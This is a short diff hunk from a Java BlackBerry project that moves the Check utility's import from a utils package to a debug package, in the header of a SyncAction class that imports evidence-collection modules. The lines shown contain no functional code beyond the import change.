@@ -23,7 +23,7 @@ import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.manager.ModuleManager;
-import blackberry.utils.Check;
+import blackberry.debug.Check;
 
 public abstract class SyncAction extends SubActionMain {
     //#ifdef DEBUG
